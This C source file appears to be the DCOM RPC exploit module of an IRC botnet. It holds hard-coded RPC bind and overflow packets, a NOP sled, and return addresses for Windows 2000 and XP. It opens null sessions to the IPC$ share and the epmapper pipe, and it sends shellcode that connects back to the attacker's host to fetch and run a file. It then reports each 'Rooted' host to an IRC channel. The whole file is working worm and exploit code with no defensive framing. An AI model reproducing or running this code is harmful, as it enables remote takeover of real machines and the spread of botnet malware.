#include "..\Inc.h"
#include "..\Fun.h"
#include "..\Ext.h"

#ifndef NO_DCOM

char bindstr[] =
	"\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x7F\x00\x00\x00"
	"\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x01\x00"
	"\xa0\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x00\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00"
	"\x2B\x10\x48\x60\x02\x00\x00\x00";

char request1[] =
	"\x05\x00\x00\x03\x10\x00\x00\x00\xE8\x03\x00\x00\xE5\x00\x00\x00"
	"\xD0\x03\x00\x00\x01\x00\x04\x00\x05\x00\x06\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x32\x24\x58\xFD\xCC\x45\x64\x49\xB0\x70\xDD\xAE"
	"\x74\x2C\x96\xD2\x60\x5E\x0D\x00\x01\x00\x00\x00\x00\x00\x00\x00"
	"\x70\x5E\x0D\x00\x02\x00\x00\x00\x7C\x5E\x0D\x00\x00\x00\x00\x00"
	"\x10\x00\x00\x00\x80\x96\xF1\xF1\x2A\x4D\xCE\x11\xA6\x6A\x00\x20"
	"\xAF\x6E\x72\xF4\x0C\x00\x00\x00\x4D\x41\x52\x42\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x0D\xF0\xAD\xBA\x00\x00\x00\x00\xA8\xF4\x0B\x00"
	"\x60\x03\x00\x00\x60\x03\x00\x00\x4D\x45\x4F\x57\x04\x00\x00\x00"
	"\xA2\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x38\x03\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x00\x00\x00\x00\x30\x03\x00\x00\x28\x03\x00\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\xC8\x00\x00\x00\x4D\x45\x4F\x57"
	"\x28\x03\x00\x00\xD8\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
	"\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\xC4\x28\xCD\x00\x64\x29\xCD\x00\x00\x00\x00\x00"
	"\x07\x00\x00\x00\xB9\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAB\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA5\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA6\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA4\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAD\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAA\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\x07\x00\x00\x00\x60\x00\x00\x00\x58\x00\x00\x00"
	"\x90\x00\x00\x00\x40\x00\x00\x00\x20\x00\x00\x00\x78\x00\x00\x00"
	"\x30\x00\x00\x00\x01\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC"
	"\x50\x00\x00\x00\x4F\xB6\x88\x20\xFF\xFF\xFF\xFF\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC"
	"\x48\x00\x00\x00\x07\x00\x66\x00\x06\x09\x02\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x10\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x78\x19\x0C\x00"
	"\x58\x00\x00\x00\x05\x00\x06\x00\x01\x00\x00\x00\x70\xD8\x98\x93"
	"\x98\x4F\xD2\x11\xA9\x3D\xBE\x57\xB2\x00\x00\x00\x32\x00\x31\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x80\x00\x00\x00\x0D\xF0\xAD\xBA"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x18\x43\x14\x00\x00\x00\x00\x00\x60\x00\x00\x00\x60\x00\x00\x00"
	"\x4D\x45\x4F\x57\x04\x00\x00\x00\xC0\x01\x00\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x3B\x03\x00\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x00\x00\x00\x00\x30\x00\x00\x00"
	"\x01\x00\x01\x00\x81\xC5\x17\x03\x80\x0E\xE9\x4A\x99\x99\xF1\x8A"
	"\x50\x6F\x7A\x85\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x30\x00\x00\x00\x78\x00\x6E\x00"
	"\x00\x00\x00\x00\xD8\xDA\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x20\x2F\x0C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00"
	"\x00\x00\x00\x00\x03\x00\x00\x00\x46\x00\x58\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x10\x00\x00\x00\x30\x00\x2E\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x68\x00\x00\x00\x0E\x00\xFF\xFF"
	"\x68\x8B\x0B\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

char request2[] =
	"\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x5C\x00\x5C\x00";

/*	\E$\938479272375092753287.xls
	\F$\993847593892837527687.bat
	\S$\267364889234572836487.cmd
	\Y$\128736872350982734872.zip
	\V$\287348927347869928738.rar
	\W$\348579872387469762349.tmp
	\X$\349587230872349876934.bla
	\U$\349879876098209889734.h4x */

char request3[] = // \C$\123456111111111111111.doc
	"\x5C\x00\x43\x00\x24\x00\x5C\x00\x31\x00\x32\x00\x33\x00\x34\x00"
	"\x35\x00\x36\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00"
	"\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00"
	"\x31\x00\x2E\x00\x64\x00\x6F\x00\x63\x00\x00\x00";

char request4[] =
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x20\x00\x00\x00\x30\x00\x2D\x00"
	"\x00\x00\x00\x00\x88\x2A\x0C\x00\x02\x00\x00\x00\x01\x00\x00\x00"
	"\x28\x8C\x0C\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00";

char shellcode_start[]=
	"\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00"
	"\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00\x46\x00\x58\x00"
	"\x46\x00\x58\x00"
	"\xff\xff\xff\xff"	/* return address */
	"\xcc\xe0\xfd\x7f"	/* primary thread data block */
	"\xcc\xe0\xfd\x7f";	/* primary thread data block */

char nops[] =
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90";

unsigned long call_ebx_offsets[] = {
	0x010016C6,		// Win2K
	0x0100139d      // WinXP
};

BOOL ConnectViaNullSession(const char *remote_host, LPNETRESOURCEW nr)
{
	WCHAR Ipc[] = L"\\IPC$", Resource[280] = L"\\\\";
	TCHAR szServer[280] = TEXT("");

	MultiByteToWideChar(CP_ACP, 0, (LPCSTR)remote_host, -1, (wchar_t*)szServer, 255);
	wcscat(Resource,(wchar_t*)szServer);
	wcscat(Resource,Ipc);

	nr->dwType       = RESOURCETYPE_ANY;
	nr->lpLocalName  = NULL;
	nr->lpRemoteName = Resource;
	nr->lpProvider   = NULL;

	DWORD result = fWNetAddConnection2W(nr, L"", L"", 0);

	if (result == 5 || result == 1219)
		result = fWNetAddConnection2W(nr, NULL, NULL, 0);
	if (result == 5 || result == 1219)
		return FALSE;

	return TRUE;
}

BOOL CloseNullSession(const char *remote_host)
{
	WCHAR Ipc[] = L"\\IPC$", Resource[280] = L"\\\\";
	TCHAR szServer[280] = TEXT("");

	MultiByteToWideChar(CP_ACP, 0, (LPCSTR)remote_host, -1, (wchar_t*)szServer, 255);
	wcscat(Resource, (wchar_t*)szServer);
	wcscat(Resource, Ipc);

	while (fWNetCancelConnection2W(Resource, 0, FALSE) != NO_ERROR)
		Sleep(2000);

	return TRUE;
}

char *CreateDCOMRequestPacket(EXINFO exinfo, DWORD *RequestPacketSize, int TargetOS, BOOL NamedPipe)
{
	char *pTemp, szSCBuf[4096], szReqBuf[4096], szShellBuf[4096];
	int iShellSize = 0, iPos = 0, iSCSize = 0, iReqSize = 0, iNOPSize = sizeof(nops)-1;

	// get shellcode
	iShellSize = GetRNS0TerminatedShellcode(szShellBuf, 4096, GetIP(exinfo.sock), filename);
	if (!iShellSize)
		return 0;

	// build a buffer with the shellcode
	memcpy(szSCBuf+iPos, shellcode_start, sizeof(shellcode_start)-1); iPos += sizeof(shellcode_start)-1;
	memset(szSCBuf+iPos, '\x90',          iNOPSize                 ); iPos += iNOPSize;
	memcpy(szSCBuf+iPos, szShellBuf,      iShellSize               ); iPos += iShellSize;
	iSCSize = iPos; iPos = 0;

	// prepend NOPs as long as shellcode doesn't fit RPC packet format
	while ((iSCSize % 16) != 12) {
		iNOPSize++;
		memcpy(szSCBuf+iPos, shellcode_start, sizeof(shellcode_start)-1); iPos += sizeof(shellcode_start)-1;
		memset(szSCBuf+iPos, '\x90',          iNOPSize                 ); iPos += iNOPSize;
		memcpy(szSCBuf+iPos, szShellBuf,      iShellSize               ); iPos += iShellSize;
		iSCSize = iPos; iPos = 0;
	}

	// set the return address
	if (NamedPipe) {
		if (TargetOS == OS_WINXP || TargetOS == OS_UNKNOWN)
			memcpy(szSCBuf+36, (char *)&call_ebx_offsets[1], 4);
		else
			memcpy(szSCBuf+36, (char *)&call_ebx_offsets[0], 4);
	} else {
		if (TargetOS == OS_WINXP)
			memcpy(szSCBuf+36, (char*)&call_ebx_offsets[1], 4);
		else
			memcpy(szSCBuf+36, (char*)&call_ebx_offsets[0], 4);
	}

	// build the request
	memcpy(szReqBuf+iPos, request1, sizeof(request1)-1); iPos += sizeof(request1)-1;
	memcpy(szReqBuf+iPos, request2, sizeof(request2)-1); iPos += sizeof(request2)-1;
	memcpy(szReqBuf+iPos, szSCBuf,  iSCSize           ); iPos += iSCSize;
	memcpy(szReqBuf+iPos, request3, sizeof(request3)-1); iPos += sizeof(request3)-1;
	memcpy(szReqBuf+iPos, request4, sizeof(request4)-1); iPos += sizeof(request4)-1;
	iReqSize = iPos;

	// fill the request with the right sizes
	pTemp = szReqBuf + (sizeof(request1)-1);
	*(unsigned long*)(pTemp)     = *(unsigned long*)(pTemp)     + iSCSize / 2;
	*(unsigned long*)(pTemp+8)   = *(unsigned long*)(pTemp+8)   + iSCSize / 2; pTemp = szReqBuf;
	*(unsigned long*)(pTemp+8)   = *(unsigned long*)(pTemp+8)   + iSCSize - 12;
	*(unsigned long*)(pTemp+16)  = *(unsigned long*)(pTemp+16)  + iSCSize - 12;
	*(unsigned long*)(pTemp+128) = *(unsigned long*)(pTemp+128) + iSCSize - 12;
	*(unsigned long*)(pTemp+132) = *(unsigned long*)(pTemp+132) + iSCSize - 12;
	*(unsigned long*)(pTemp+180) = *(unsigned long*)(pTemp+180) + iSCSize - 12;
	*(unsigned long*)(pTemp+184) = *(unsigned long*)(pTemp+184) + iSCSize - 12;
	*(unsigned long*)(pTemp+208) = *(unsigned long*)(pTemp+208) + iSCSize - 12;
	*(unsigned long*)(pTemp+396) = *(unsigned long*)(pTemp+396) + iSCSize - 12;

	char *Shellcode = (char *)malloc(iReqSize+1);
	memset(Shellcode, 0, iReqSize+1);
	memcpy(Shellcode, szReqBuf, iReqSize);
	*RequestPacketSize = iReqSize;

	return Shellcode;
}

BOOL dcom(EXINFO exinfo)
{
	char sendbuf[IRCLINE];

	if (exinfo.port == 445) {
		NETRESOURCEW nr;

		if (!ConnectViaNullSession(exinfo.ip, &nr))
			return FALSE;
		else {
			char szPipePath[MAX_PATH];
			sprintf(szPipePath, "\\\\%s\\pipe\\epmapper", exinfo.ip);
			HANDLE hFile = CreateFile(szPipePath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

			if (hFile == INVALID_HANDLE_VALUE) {
				CloseNullSession(exinfo.ip);
				return FALSE;
			}

			// sprintf(sendbuf, "[dcom]: Connected to pipe \\\\%s\\pipe\\epmapper", exinfo.ip);
			// irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);

			int TargetOS = FpHost(exinfo.ip, FP_PORT5K);

			// get shellcode
			DWORD reqbufsize;
			char *reqbuf = CreateDCOMRequestPacket(exinfo, &reqbufsize, TargetOS, TRUE);
			if (!reqbuf) {
				CloseHandle(hFile);
				CloseNullSession(exinfo.ip);
				return FALSE;
			}

			unsigned long lWritten;
			char *szInBuf = (char *)malloc(100000);
			memset(szInBuf, 0, 100000);

			// send the bind string
			DWORD dwRead;
			TransactNamedPipe(hFile, bindstr, sizeof(bindstr)-1, szInBuf, 10000, &dwRead, NULL);
			if (szInBuf[2] != 0x0C) {
				free(szInBuf);
				free(reqbuf);
				CloseHandle(hFile);
				CloseNullSession(exinfo.ip);
				return FALSE;
			}

			// send the evil request
			if (!WriteFile(hFile, reqbuf, reqbufsize, &lWritten, 0)) {
				free(szInBuf);
				free(reqbuf);
				CloseHandle(hFile);
				CloseNullSession(exinfo.ip);
				return FALSE;
			}

			BOOL Result = ReadFile(hFile, szInBuf, 10000, &dwRead, NULL);

			free(reqbuf);
			free(szInBuf);
			CloseHandle(hFile);
			CloseNullSession(exinfo.ip);

			if (Result == TRUE) {
				return FALSE;
			}
		}

	} else { // port 135 and others

		int TargetOS = FpHost(exinfo.ip, FP_RPC);
		if (TargetOS == OS_WINNT)
			return FALSE;

		// get a funky fresh socket
		SOCKET sSocket = fsocket(AF_INET, SOCK_STREAM, IPPROTO_IP);
		if (sSocket == SOCKET_ERROR)
			return FALSE;

		// fill in sockaddr and resolve the host
		SOCKADDR_IN ssin;
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned short)exinfo.port);
		ssin.sin_addr.s_addr = finet_addr(exinfo.ip);

		// get shellcode
		DWORD reqbufsize;
		char *reqbuf = CreateDCOMRequestPacket(exinfo, &reqbufsize, TargetOS, FALSE);
		if (!reqbuf) {
			fclosesocket(sSocket);
			return FALSE;
		}

		// connect to the server
		int iErr = fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
		if (iErr == -1) { // connect failed, exit
			free(reqbuf);
			fclosesocket(sSocket);
			return FALSE;
		}

		// send the bind string
		if (fsend(sSocket, bindstr, sizeof(bindstr)-1, 0) == SOCKET_ERROR) {
			free(reqbuf);
			fclosesocket(sSocket);
			return FALSE;
		}

		// read reply
		char recvbuf[4096];
		frecv(sSocket, recvbuf, 4096, 0);
		// Send the evil request
		if (fsend(sSocket, reqbuf, reqbufsize, 0) == SOCKET_ERROR) {
			free(reqbuf);
			fclosesocket(sSocket);
			return FALSE;
		}

		// read reply
		if (frecv(sSocket, recvbuf, 4096, 0) == SOCKET_ERROR) {
			free(reqbuf);
			fclosesocket(sSocket);
			return FALSE;
		}

		free(reqbuf);
		// Close the socket
		fclosesocket(sSocket);
	}

	sprintf(sendbuf,"%s Rooted: %s", sc_title, exinfo.ip);
	for (int i=0; i < 6; i++) {
		if (searchlog(sendbuf)) {
			sprintf(sendbuf, "%s Trying to Root: %s", sc_title, exinfo.ip);
			if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);
			addlog(sendbuf);
			exploit[exinfo.exploit].stats++;

			break;
		}
		Sleep(5000);
	}

	return TRUE;
}
#endif